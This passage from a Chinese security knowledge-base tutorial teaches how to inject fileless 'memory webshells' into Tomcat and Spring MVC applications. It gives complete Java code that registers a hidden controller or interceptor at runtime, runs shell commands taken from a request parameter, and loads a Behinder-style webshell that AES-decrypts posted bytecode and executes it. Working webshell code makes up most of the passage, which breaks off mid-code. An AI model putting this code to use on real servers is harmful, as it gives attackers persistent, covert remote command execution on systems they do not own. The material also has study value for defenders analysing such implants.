servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); ListenerDemo listenerDemo = new ListenerDemo(); standardContext.addApplicationEventListener(listenerDemo); out.println(\"inject success\"); 因为无回显，所以我们只能执行命令，如弹出计算器 JSP 总结 以上三种根据Servlet的特性，动态注入，jsp文件只要落地，即可动态加载到内存中 姿势 优点 缺点 Filter 1.通过添加全局拦截器对参数进行拦截，来进行恶意代码执行2.通过添加filtermap，可以随便设置路由，所有请求都会过该拦截器 1.引入filterMaps，filterDef，要根据tomcat版本来判断2.代码量较高 Servlet 1. 简单方便，了解Servlet生命周期即可2.更直观了解如何动态添加ServletMapping 1.无法使所有参数都经过恶意代码，只能在我们自己设定的url中才能触发 Listener 1. 简单方便，通过添加监听器对request进行监控2. 在任意url中都能设置我们监听的参数 1. 只要监听的参数含有就会进入监听代码中2. 如果在该jsp页面下访问，则会重放请求 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:27:19 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/10.Tomcat内存马基础入门.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/11.Spring框架内存马入门.html":{"url":"知识库/02.JAVA安全/11.Spring框架内存马入门.html","title":"11.Spring框架内存马入门","keywords":"","body":" Spring Web 介绍 Bean ApplicationContext ContextLoaderListener 与 DispatcherServlet ContextLoaderListener DispatcherServlet 创建Spring MVC项目 Controller 手动注册Controller 获取当前代码运行的上下文环境（dispatcherServlet） RequestContextUtils getAttribute 阻止重复添加controller (非必须) 实例(添加Controller) 0x1 注入普通马 0x2 注入冰蝎马 基本逻辑 问题 拦截器 手工创建拦截器 分析拦截器的整个过程 动态注入 实例 0x1 注入普通马 0x2 注入冰蝎马 无文件落地注入 0x1 jndi 测试 0x2 jndi 注入冰蝎马 问题总结 参考链接 Spring Web 介绍 Bean bean 是Spring 框架的一个核心概念，它是构建程序的主干，并且是由Spring loC 容器负责实例化、配置、组装和管理的对象。 通俗来讲 bean 是对象 bean 被 loC容器管理 Spring 应用由一个个bean构成 ApplicationContext Spring 框架中，BeanFactory 接口是 Spring loC容器的实际代表者 从下面的接口继承关系图可以看出，ApplicationContext接口继承了BeanFactory接口，并通过继承其他接口进一步扩展了基本容器的功能 因此，org.springframework.context.ApplicationContext接口也代表了 IoC容器 ，它负责实例化、定位、配置应用程序中的对象(bean)及建立这些对象间(beans)的依赖 IoC容器通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用xml、Java注解或Java代码来表示。 ContextLoaderListener 与 DispatcherServlet 下面是一个典型 Spring 应用的 web.xml 配置示例： HelloSpringMVC contextConfigLocation /WEB-INF/applicationContext.xml org.springframework.web.context.ContextLoaderListener dispatcherServlet org.springframework.web.servlet.DispatcherServlet contextConfigLocation /WEB-INF/dispatcherServlet-servlet.xml 1 dispatcherServlet / 在正式了解上面的配置前，先介绍下关于 Root Context 和 Child Context 的重要概念： Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，剩下的全是 Child Context 所有Child Context都可以访问在 Root Context中定义的 bean，但是Root Context无法访问Child Context中定义的 bean 所有的Context在创建后，都会被作为一个属性添加到了 ServletContext中ContextLoaderListener ContextLoaderListener 主要被用来初始化全局唯一的Root Context，即 Root WebApplicationContext。 这个 Root WebApplicationContext 会和其他 Child Context 实例共享它的 IoC 容器，供其他 Child Context 获取并使用容器中的 bean。 回到 web.xml 中，其相关配置如下： ```xml contextConfigLocation /WEB-INF/applicationContext.xml org.springframework.web.context.ContextLoaderListener 依照规范，当没有显式配置 ContextLoaderListener 的 contextConfigLocation 时，程序会自动寻找 /WEB-INF/applicationContext.xml，作为配置文件，所以其实上面的 标签对其实完全可以去掉。 #### DispatcherServlet DispatcherServlet 的主要作用是处理传入的web请求，根据配置的 URL pattern，将请求分发给正确的 Controller 和 View。 DispatcherServlet 初始化完成后，会创建一个普通的 Child Context 实例。 剩下的servlet 标签中，配置项如下 ```xml dispatcherServlet org.springframework.web.servlet.DispatcherServlet contextConfigLocation /WEB-INF/dispatcherServlet-servlet.xml 1 上面给 org.springframework.web.servlet.DispatcherServlet 类设置了个别名 dispatcherServlet ，并配置了它的 contextConfigLocation 参数值为 /WEB-INF/dispatcherServlet-servlet.xml 依照规范，当没有显式配置 contextConfigLocation 时，程序会自动寻找 /WEB-INF/-servlet.xml，作为配置文件。因为上面的 是 dispatcherServlet，所以当没有显式配置时，程序依然会自动找到 /WEB-INF/dispatcherServlet-servlet.xml 配置文件 综上，可以了解到：每个具体的 DispatcherServlet 创建的是一个 Child Context，代表一个独立的 IoC 容器；而 ContextLoaderListener 所创建的是一个 Root Context，代表全局唯一的一个公共 IoC 容器 如果要访问和操作 bean ，一般要获得当前代码执行环境的IoC 容器 代表者 ApplicationContext 创建Spring MVC项目 这里使用maven创建spring mvc 项目，实现版本控制 这里选择maven-archetypes-webapp 这里记得选择本地配置好的源为aliyun的maven配置文件，这样会快一些 等待maven 下载好之后，就可以看到如下的目录结构 然后添加SpringMVC的相关包 4.0.0 org.example SpringMVC_Test 1.0-SNAPSHOT war SpringMVC_Test Maven Webapp http://www.example.com UTF-8 1.7 1.7 4.3.18.RELEASE junit junit 4.11 test org.springframework spring-core ${spring.version} org.springframework spring-web ${spring.version} org.springframework spring-oxm ${spring.version} org.springframework spring-tx ${spring.version} org.springframework spring-jdbc ${spring.version} org.springframework spring-webmvc ${spring.version} org.springframework spring-aop ${spring.version} org.springframework spring-context-support ${spring.version} org.springframework spring-test ${spring.version} SpringMVC_Test maven-clean-plugin 3.1.0 maven-resources-plugin 3.0.2 maven-compiler-plugin 3.8.0 maven-surefire-plugin 2.22.1 maven-war-plugin 3.2.2 maven-install-plugin 2.5.2 maven-deploy-plugin 2.8.2 然后添加SpringMVC框架，右键项目，点击Add Framework Support 如果在Add framework support中找不到Spring，那是因为项目中可能已经存在Spring相关文件，但不一定是完善的。因此我们要将已经存在的Spring给删掉，重新添加，方法如下： 点击Project Structure，选择Facets，就会看到有一个Spring啦，右击它，点删除就行啦，然后再回到上面第3步重新Add framework support Spring框架添加完之后，会看到目录下多了两个xml文件 下面开始配置web.xml HelloSpringMVC contextConfigLocation /WEB-INF/applicationContext.xml org.springframework.web.context.ContextLoaderListener dispatcher org.springframework.web.servlet.DispatcherServlet contextConfigLocation /WEB-INF/dispatcher-servlet.xml 1 dispatcher / 配置dispatcher-servlet.xml，负责mvc的配置 然后注意，需要在main目录中添加java、resource文件夹，并且在java目录下，添加包名com.spring.Controller,因为我们在dispatcher-servlet.xml中添加了 这个意思就是扫描com.spring.Controller包下的Controller，这样才能访问到写的Controller 最后再配置一下本地Tomcat 出现了warning，此时点击fix即可，或者 Controller 手动注册Controller 首先查看dispatcher-servlet.xml 视图路径在/WEB-INF/jsp/目录下 在/WEB-INF/jsp/目录下创建hello.jsp，isELIgnored=\"false\"这里一定要添加，否则model传过来的值，在高版本的SpringMVC中不会解析EL表达式 Title hello world ,${name} 一个正常的 Controller 示例代码如下，当用浏览器访问 /hi/say路径时，会在定义好的 View 中输出 hello world,aaron 字样 @Controller @RequestMapping(\"/hi\") public class HelloController { @RequestMapping(\"say\") public String say(Model model){ model.addAttribute(\"name\",\"aaron\"); return \"hello\"; } } 获取当前代码运行的上下文环境（dispatcherServlet） 在这里我通过使用LandGrey@观星实验室的方法获取到Root WebApplicationContext，注入也能成功，但是会报错，提示没有dispatcherServlet，也就是不能分发给对应的Controller，由于Root WebApplicationContext是无法访问到Child WebApplicationContext 定义的bean，applicationContext.xml全局配置也没有搞定，希望有大佬可以给我applicationContext.xml的相关配置，以及如何成功利用 这里使用LandGrey@观星实验室大佬的后两种获取Child Context的方法 RequestContextUtils WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()); 这里使用RequestContextUtils中的WebApplicationContext getWebApplicationContext(ServletRequest request)方法，通过 ServletRequest类的实例来获取WebApplicationContext 当拿到了这个WebApplicationContext之后，就需要在当前的context里注册Controller，然后给这个Controller绑定对应可解析的url，以及方法 public class InjectController { public InjectController() { // 从context中获得 RequestMappingHandlerMapping 的实例 RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class); // 通过反射获得自定义 controller 中的 Method 对象 Method method = Class.forName(\"com.spring.Controller.InjectController\").getMethod(\"test\"); // 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\"/ccc\"); // 定义允许访问 controller 的 HTTP 方法（GET/POST） RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); com.spring.Controller.InjectController injectToController = new com.spring.Controller.InjectController(); requestMappingHandlerMapping.registerMapping(info, injectToController, method); } public void test(){ xxx } } 在test方法中，需要实现我们的webshell的逻辑，首先需要完善webshell java.lang.Runtime.getRuntime().exec(\"command\"); 然后在将command变成我们可控制的，也就是传入可控参数，这时就需要获取当前的request和response，command 为request.getParamer(\"cmd\")就为可控参数了，所以就是获取request，response的问题了，这里我们使用spring提供获取request，response的方法，这里使用如下方法 HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); test方法可以使用如下表示 public void test() throws IOException { // 获取request和response对象 HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); // 获取cmd参数并执行命令 java.lang.Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } getAttribute WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); 同上，因为获取的都是Child WebApplicationContext 阻止重复添加controller (非必须) 这里使用bitterz大佬的代码 上面获取的requestMappingHandlerMapping中有一个mappingRegistry成员对象，而该对象下的urlLookup属性保存了已经注册的所有url路径，对mappingHandlerMapping进一步后发现，以上对象和属性都是私有的，且mappingRegistry并非mappingHandlerMapping中创建的，而是来自于基类AbstractHandlerMethodMapping。 AbstractHandlerMethodMapping基类的getMappingRegistry方法可以获取mappingRegistry，而urlLookup是其内部类MappingRegistry的私有属性，可以通过反射获取，反射获取urlLookup和判断我们给定的url是否被注册的代码块如下 // 获取abstractHandlerMethodMapping对象，以便反射调用其getMappingRegistry方法 AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class); // 反射调用getMappingRegistry方法 Method method = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping\").getDeclaredMethod(\"getMappingRegistry\"); method.setAccessible(true); Object mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping); // 反射获取urlLookup属性 Field field = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry\").getDeclaredField(\"urlLookup\"); field.setAccessible(true); Map urlLookup = (Map) field.get(mappingRegistry); // 判断我们想要注入的路径是否被已经存在 Iterator urlIterator = urlLookup.keySet().iterator(); List urls = new ArrayList(); while (urlIterator.hasNext()){ String urlPath = (String) urlIterator.next(); if (\"/malicious\".equals(urlPath)){ System.out.println(\"url已存在\"); return; } } 实例(添加Controller) 0x1 注入普通马 在上述知道了具体的操作方法，我在这里使用一个手动注册的Controller，里面包含恶意代码，这样来模拟一下无文件内存马 package com.spring.Controller; import org.springframework.beans.factory.NoSuchBeanDefinitionException; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping; import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition; import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.util.ArrayList; import java.util.Iterator; import java.util.List; import java.util.Map; @Controller public class HelloWorldController { public HelloWorldController() {} public void test() throws IOException { // 获取request和response对象 HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); // 获取cmd参数并执行命令 java.lang.Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } @RequestMapping(value = \"/hello\") public String hello(Model model) throws NoSuchBeanDefinitionException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException { WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 2. 从context中获得 RequestMappingHandlerMapping 的实例 RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); // 判断url是否存在 AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class); Method method = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping\").getDeclaredMethod(\"getMappingRegistry\"); method.setAccessible(true); Object mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping); Field field = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry\").getDeclaredField(\"urlLookup\"); field.setAccessible(true); Map urlLookup = (Map) field.get(mappingRegistry); Iterator urlIterator = urlLookup.keySet().iterator(); List urls = new ArrayList(); while (urlIterator.hasNext()){ String urlPath = (String) urlIterator.next(); if (\"/test\".equals(urlPath)){ System.out.println(\"url已存在\"); return \"hello\"; } } // 可选步骤，判断url是否存在 // 2. 通过反射获得自定义 controller 中test的 Method 对象 Method method2 = HelloWorldController.class.getMethod(\"test\"); // 3. 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\"/test\"); // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST） RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); // 创建用于处理请求的对象 HelloWorldController injectToController = new HelloWorldController(); mappingHandlerMapping.registerMapping(info, injectToController, method2); model.addAttribute(\"name\",\"aaron\"); return \"hello\"; } } 目录结构如下，其中com.spring.Controller包的俩controller分别是两种获取Child WebApplicationContext的方法实现 在代码中可以看到，访问/hello，就会执行hello方法，然后就会动态注入url=>/test，以及controller(test方法) 0x2 注入冰蝎马 冰蝎马如下 可以看出，该jsp的核心功能有三点 为了方便地使用defineClass，创建了U这个类继承ClassLoader； 使用java自带的包，解密AES加密数据 使用defineClass加载AES解密后字节码，获得一个恶意类，利用newInstance创建这个类的实例，并调用equals方法 要特别注意pageContext这个对象，它是jsp文件运行过程中自带的对象，可以获取request/response/session这三个包含页面信息的重要对象，对应pageContext有getRequest/getResponse/getSession方法，所以注入的controller代码中，可以将pageContext换成一个Map，手动添加key和value即可。 冰蝎马需要继承ClassLoader后调用父类的defineClass，当然也可以用反射，但是这样更方便而已。对恶意类稍加改造，继承ClassLoader、定义新的构造函数、增加g函数、添加冰蝎的服务端代码 基本逻辑 public HttpServletResponse test() throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IOException, BadPaddingException, IllegalBlockSizeException, IllegalAccessException, InstantiationException { HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); HttpSession session = request.getSession(); if (request.getMethod().equals(\"POST\")) { session.setAttribute(\"u\", this.k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(this.k.getBytes(), \"AES\")); HelloWorldController helloWorldController = new HelloWorldController(ClassLoader.getSystemClassLoader()); String base64String = request.getReader().readLine(); byte[] bytesEncrypted = new sun.misc.BASE64Decoder().decodeBuffer(base64String); byte[] bytesDecrypted = c.doFinal(bytesEncrypted); Class newClass = helloWorldController.g(bytesDecrypted); Map pageContext = new HashMap(); pageContext.put(\"session\", session); pageContext.put(\"request\", request); pageContext.put(\"response\", response); newClass.newInstance().equals(pageContext); } return response; } 完整代码如下： package com.spring.Controller; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping; import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition; import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.crypto.BadPaddingException; import javax.crypto.Cipher; import javax.crypto.IllegalBlockSizeException; import javax.crypto.NoSuchPaddingException; import javax.crypto.spec.SecretKeySpec; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.security.InvalidKeyException; import java.security.NoSuchAlgorithmException; import java.util.*; @Controller public class HelloWorldController extends ClassLoader { private final String uri = \"/test\"; private final String k = \"e45e329feb5d925b\"; public HelloWorldController(ClassLoader c) { super(c); } public Class g(byte[] b) { return super.defineClass(b, 0, b.length); // 调用父类的defineClass函数 } public HelloWorldController() { } public HttpServletResponse test() throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IOException, BadPaddingException, IllegalBlockSizeException, IllegalAccessException, InstantiationException { HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); HttpSession session = request.getSession(); if (request.getMethod().equals(\"POST\")) { session.setAttribute(\"u\", this.k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(this.k.getBytes(), \"AES\")); HelloWorldController helloWorldController = new HelloWorldController(ClassLoader.getSystemClassLoader()); String base64String = request.getReader().readLine(); byte[] bytesEncrypted = new sun.misc.BASE64Decoder().decodeBuffer(base64String); byte[] bytesDecrypted = c.doFinal(bytesEncrypted); Class newClass = helloWorldController.g(bytesDecrypted); Map pageContext = new HashMap(); pageContext.put(\"session\", session); pageContext.put(\"request\", request); pageContext.put(\"response\", response); newClass.newInstance().equals(pageContext); } return response; } @RequestMapping(value = \"/hello\") public String hello(Model model) throws ClassNotFoundException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException { WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 2. 从context中获得 RequestMappingHandlerMapping 的实例 RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); // 判断url是否存在 AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class); Method method = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping\").getDeclaredMethod(\"getMappingRegistry\"); method.setAccessible(true); Object mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping); Field field = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry\").getDeclaredField(\"urlLookup\"); field.setAccessible(true); Map urlLookup = (Map) field.get(mappingRegistry); Iterator urlIterator = urlLookup.keySet().iterator(); List urls = new ArrayList(); while (urlIterator.hasNext()) { String urlPath = (String) urlIterator.next(); if (\"/test\".equals(urlPath)) { System.out.println(\"url已存在\"); return \"hello\"; } } // 可选步骤，判断url是否存在 // 2. 通过反射获得自定义 controller 中test的 Method 对象 Method method2 = HelloWorldController.class.getMethod(\"test\"); // 3. 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\"/test\"); // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST） RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); // 创建用于处理请求的对象 HelloWorldController injectToController = new HelloWorldController(); mappingHandlerMapping.registerMapping(info, injectToController, method2); model.addAttribute(\"name\", \"aaron\"); return \"hello\"; } } 问题 为什么会添加一个空构造函数（缺省构造函数）？ 由于在当前类里面定义了“有参构造方法”，这样的话在实例化的时候，没有传参，就会出现此异常，需要添加一个覆盖原先的“无参构造方法”，所以在类里面加上“无参构造方法”就可以解决问题了 sun.misc.BASE64Decoder().decodeBuffer(base64String) jdk11+不支持，使用jdk8可直接使用，如果目标环境是jdk8+，那么建议自己写一个base64解码器来解码 ClassLoader.getSystemClassLoader() 如果随意给定某个继承自ClassLoader的类，可能会出现报错java.lang.LinkageError : attempted duplicate class definition for name。这是因为需要使用getSystemClassLoader()获取创建ClassLoader时需要添加委派父级 拦截器 拦截器(Interceptor)在开发中处于非常重要的环节，全局拦截器可以针对接口授权情况进行放行或拦截，也可以进行身份验证，不满足则直接拦截，所有的请求都会先经过拦截器，然后才到达Controller，执行，最后返回，所以如果能动态注册一个拦截器，对所有的请求进行拦截，等到得到了我们设置的参数，再进行操作 手工创建拦截器 首先创建一个类 package com.spring.Interceptor; import org.springframework.web.servlet.handler.HandlerInterceptorAdapter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; public class TestInterceptor extends HandlerInterceptorAdapter { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response,Object handler){ String code = request.getParameter(\"code\"); if(code !=null){ try{ Runtime.getRuntime().exec(\"calc.exe\"); }catch (IOException e){ e.printStackTrace(); } } return true; } } 然后在dispatcher-Servlet.xml 配置 当访问hello路由的时候，就会触发拦截器 这里一定得有路由，如果没有注册hello这个路由，那么拦截器就无效果 分析拦截器的整个过程 完整的调用链如下所示： preHandle:20, TestInterceptor (com.spring.Interceptor) applyPreHandle:133, HandlerExecutionChain (org.springframework.web.servlet) doDispatch:962, DispatcherServlet (org.springframework.web.servlet) doService:901, DispatcherServlet (org.springframework.web.servlet) processRequest:970, FrameworkServlet (org.springframework.web.servlet) doGet:861, FrameworkServlet (org.springframework.web.servlet) service:626, HttpServlet (javax.servlet.http) service:846, FrameworkServlet (org.springframework.web.servlet) service:733, HttpServlet (javax.servlet.http) internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core) doFilter:166, ApplicationFilterChain (org.apache.catalina.core) doFilter:52, WsFilter (org.apache.tomcat.websocket.server) internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core) doFilter:166, ApplicationFilterChain (org.apache.catalina.core) invoke:201, StandardWrapperValve (org.apache.catalina.core) invoke:97, StandardContextValve (org.apache.catalina.core) invoke:544, AuthenticatorBase (org.apache.catalina.authenticator) invoke:143, StandardHostValve (org.apache.catalina.core) invoke:81, ErrorReportValve (org.apache.catalina.valves) invoke:698, AbstractAccessLogValve (org.apache.catalina.valves) invoke:78, StandardEngineValve (org.apache.catalina.core) service:364, CoyoteAdapter (org.apache.catalina.connector) service:616, Http11Processor (org.apache.coyote.http11) process:65, AbstractProcessorLight (org.apache.coyote) process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1629, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:49, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:748, Thread (java.lang) 关键的点在于doDispatch方法处，先通过getHandler方法获取了mappedHandler对象 在后方调用mappedHandler的applyPreHandler方法 这个方法中就是依次调用每个interceptor实例的preHandle方法，实际上就进入了前面写好的TestInterceptor类的preHandle方法中 在这里就有去调用写的TestInterceptor类中的preHandle方法 最后到我们写的方法中，执行完成返回true，至此就完成拦截器的调用 动态注入 跟踪mappedHandler的获取过程，先是调用了org.springframework.web.servlet.DispatcherServlet中的getHandler方法 跟进getHandler方法，遍历了this.handlerMappings 跟进getHandler(request)方法， 发现是调用的是AbstractHandlerMapping (org.springframework.web.servlet.handler) 也就是org.springframework.web.servlet.handler.AbstractHandlerMapping类中getHandler方法 再跟进getHandlerExecutionChain方法 发现其中会遍历adaptedInterceptors这数组，并判断获取的interceptor实例是不是MappedInterceptor类的实例对象，而MappedInterceptor类就是对拦截器HandlerInterceptor接口的实现，所以前面定义的TestInterceptor自然会被加入chain中并返回 那么如果我们能将恶意的interceptor实例添加到org.springframework.web.servlet.handler.AbstractHandlerMapping类的实例对象的adaptedInterceptors中，那么就可以完成动态注入那么关键就在于找到org.springframework.web.servlet.handler.AbstractHandlerMapping类的实例对象，CTRL+ALT+B找到所有AbstractHandlerMapping的子类，并在beanFactory的beanDefinitionNames中找到它的实例 因此可以通过context.getBean(\"org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\")获取该对象，再反射获取其中的adaptedInterceptors属性，并添加恶意interceptor实例对象即可完成内存马的注入 实例 0x1 注入普通马 package com.spring.Controller; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.servlet.handler.HandlerInterceptorAdapter; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; @Controller public class Test extends HandlerInterceptorAdapter { @RequestMapping(value = \"/a\") public String test() throws NoSuchFieldException, IllegalAccessException { // 获取当前上下文的dispatch-servletContext WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 从context中获取AbstractHandlerMapping的实例对象 org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); // 反射获取adaptedInterceptors属性 java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\"); field.setAccessible(true); java.util.ArrayList adaptedInterceptors = (java.util.ArrayList)field.get(abstractHandlerMapping); System.out.println(adaptedInterceptors); System.out.println(adaptedInterceptors.get(0).getClass().toString()); // 避免重复 for(Object object : adaptedInterceptors){ if(object instanceof Test){ System.out.println(\"已经添加过Test实例了\"); return \"hello\"; } } // 向添加恶意的interceptor实例对象 Test test = new Test(); adaptedInterceptors.add(test); return \"hello\"; } public Test(){} // 复写 prehandle方法 @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception{ String code = request.getParameter(\"code\"); // 不干扰正常业务逻辑 if (code != null) { java.lang.Runtime.getRuntime().exec(code); return true; } else { return true; } } } 访问该路由之后，如下所示，在 adaptedInterceptors 数组中已经有添加过的恶意添加的interceptor 最后在如下所示code参数添加命令，则可以直接执行命令 0x2 注入冰蝎马 原理同controller注入冰蝎马 package com.spring.Controller; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import org.springframework.web.servlet.handler.HandlerInterceptorAdapter; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.util.HashMap; import java.util.Map; @Controller public class Test extends HandlerInterceptorAdapter { private final String k = \"e45e329feb5d925b\"; @RequestMapping(value = \"/a\") public String test() throws NoSuchFieldException, IllegalAccessException { WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\"); field.setAccessible(true); java.util.ArrayList adaptedInterceptors = (java.util.ArrayList)field.get(abstractHandlerMapping); System.out.println(adaptedInterceptors); System.out.println(adaptedInterceptors.get(0).getClass().toString()); for(Object object : adaptedInterceptors){ if(object instanceof Test){ System.out.println(\"已经添加过Test实例了\"); return \"hello\"; } } Test test = new Test(); adaptedInterceptors.add(test); return \"hello\"; } public Test(){} @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception{ String code = request.getParameter(\"code\"); // 不干扰正常业务逻辑 if (code != null) { behinder(); return true; } else { return true; } } public HttpServletResponse behinder() throws Exception { HttpServletRequest request = ((ServletRequestAttributes) 